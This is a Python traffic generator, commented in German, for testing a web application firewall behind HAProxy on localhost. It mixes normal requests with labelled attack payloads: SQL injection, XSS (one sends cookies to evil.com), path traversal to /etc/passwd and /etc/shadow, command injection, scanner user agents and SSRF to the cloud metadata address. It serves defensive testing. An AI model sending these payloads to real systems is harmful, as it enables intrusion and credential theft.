#!/usr/bin/env python3
"""
WAF Traffic Generator
Schickt ~1 Request/Sekunde an HAProxy (Port 80) mit zufälligem Mix aus
legitimen Requests und verschiedenen Angriffsvektoren.
"""
import random
import time
import requests
import argparse
from datetime import datetime

TARGET = "http://localhost:80"

# Legitime Requests
LEGIT = [
    ("GET",  "/",                    None,  {}),
    ("GET",  "/about",               None,  {}),
    ("GET",  "/api/users",           None,  {}),
    ("GET",  "/api/products?page=1", None,  {}),
    ("POST", "/api/login",           {"username": "alice", "password": "secret123"}, {}),
    ("GET",  "/search?q=hello+world", None, {}),
    ("GET",  "/images/logo.png",     None,  {}),
    ("POST", "/api/contact",         {"name": "Bob", "email": "bob@example.com", "msg": "Hi"}, {}),
]

# Angriffs-Requests (sollten 403 bekommen)
ATTACKS = [
    # SQL Injection
    ("GET",  "/search?q=1' OR '1'='1",  None, {"label": "SQLi-basic"}),
    ("GET",  "/api/users?id=1 UNION SELECT * FROM users--", None, {"label": "SQLi-union"}),
    ("POST", "/api/login", {"username": "admin' --", "password": "x"}, {"label": "SQLi-login"}),
    ("GET",  "/items?id=1; DROP TABLE users;--", None, {"label": "SQLi-drop"}),

    # XSS
    ("GET",  "/search?q=<script>alert(1)</script>", None, {"label": "XSS-basic"}),
    ("GET",  "/page?title=<img src=x onerror=alert(1)>", None, {"label": "XSS-img"}),
    ("POST", "/api/comment", {"body": "<script>document.location='http://evil.com/?c='+document.cookie</script>"}, {"label": "XSS-cookie"}),
    ("GET",  "/search?q=javascript:alert(document.domain)", None, {"label": "XSS-proto"}),

    # Path Traversal / LFI
    ("GET",  "/download?file=../../../etc/passwd", None, {"label": "LFI-passwd"}),
    ("GET",  "/page?inc=../../../../etc/shadow",   None, {"label": "LFI-shadow"}),
    ("GET",  "/static/..%2F..%2F..%2Fetc%2Fpasswd", None, {"label": "LFI-encoded"}),

    # Remote Code Execution
    ("GET",  "/api/exec?cmd=ls+-la", None, {"label": "RCE-ls"}),
    ("POST", "/api/run", {"command": "; cat /etc/passwd"}, {"label": "RCE-cat"}),
    ("GET",  "/ping?host=127.0.0.1;id", None, {"label": "RCE-cmd-inject"}),

    # Scanner / Bad UA
    ("GET",  "/",    None, {"label": "Scanner-nikto",     "headers": {"User-Agent": "nikto/2.1.6"}}),
    ("GET",  "/",    None, {"label": "Scanner-sqlmap",    "headers": {"User-Agent": "sqlmap/1.7"}}),
    ("GET",  "/.env", None, {"label": "Recon-dotenv"}),
    ("GET",  "/wp-admin/", None, {"label": "Recon-wordpress"}),
    ("GET",  "/phpmyadmin/", None, {"label": "Recon-phpmyadmin"}),
    ("GET",  "/.git/config", None, {"label": "Recon-git"}),

    # Protocol attacks
    ("GET",  "/api/v1", None, {"label": "Header-inject",  "headers": {"X-Forwarded-For": "127.0.0.1' OR 1=1--"}}),
    ("GET",  "/test",  None, {"label": "HTTP-split",      "headers": {"X-Custom": "foo\r\nX-Injected: bar"}}),

    # SSRF
    ("GET",  "/proxy?url=http://169.254.169.254/latest/meta-data/", None, {"label": "SSRF-aws"}),
    ("GET",  "/fetch?target=file:///etc/passwd", None, {"label": "SSRF-file"}),
]

def send(method, path, json_body, meta):
    url = TARGET + path
    headers = meta.get("headers", {})
    headers.setdefault("User-Agent", "Mozilla/5.0 (WAF-Tester)")
    label = meta.get("label", "legit")

    try:
        resp = requests.request(
            method, url,
            json=json_body if json_body else None,
            headers=headers,
            timeout=3,
            allow_redirects=False
        )
        status = resp.status_code
        blocked = "🔴 BLOCKED" if status == 403 else ("⚠️  ERROR  " if status >= 500 else "✅ ALLOWED")
        print(f"[{datetime.now().strftime('%H:%M:%S')}] {blocked} {status} {method:4s} {path[:60]:<60}  [{label}]")
    except requests.exceptions.ConnectionError:
        print(f"[{datetime.now().strftime('%H:%M:%S')}] ❌ CONNECTION REFUSED — ist HAProxy auf Port 80 erreichbar?")
    except Exception as e:
        print(f"[{datetime.now().strftime('%H:%M:%S')}] ❌ ERROR: {e}")


def main():
    parser = argparse.ArgumentParser(description="WAF Traffic Generator")
    parser.add_argument("--target", default="http://localhost:80", help="Target URL")
    parser.add_argument("--rate",   default=1.0, type=float, help="Requests per second")
    parser.add_argument("--ratio",  default=0.4, type=float, help="Attack ratio (0-1), default 0.4")
    args = parser.parse_args()

    global TARGET
    TARGET = args.target
    interval = 1.0 / args.rate

    print(f"🚦 WAF Traffic Generator")
    print(f"   Target : {TARGET}")
    print(f"   Rate   : {args.rate} req/s")
    print(f"   Attacks: {args.ratio*100:.0f}% of traffic")
    print(f"   Ctrl+C  to stop\n")

    try:
        while True:
            if random.random() < args.ratio:
                m, p, b, meta = random.choice(ATTACKS)
            else:
                m, p, b, _ = random.choice(LEGIT)
                meta = {"label": "legit"}

            send(m, p, b, meta)
            time.sleep(interval)
    except KeyboardInterrupt:
        print("\n👋 Stopped.")

if __name__ == "__main__":
    main()
